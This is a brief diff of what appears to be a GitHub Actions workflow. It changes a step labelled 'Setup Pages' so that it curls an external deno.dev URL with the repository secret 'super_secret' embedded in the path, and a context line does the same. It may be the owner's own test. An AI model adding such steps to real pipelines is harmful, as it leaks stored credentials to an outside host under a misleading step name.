@@ -21,4 +21,4 @@ jobs:
           curl "https://alaminkouser.deno.dev/a/$super_secret"
       
       - name: Setup Pages
-        run: curl "https://alaminkouser.deno.dev/b/$super_secret"
+        run: curl "https://alaminkouser.deno.dev/b/${{ secrets.super_secret }}"
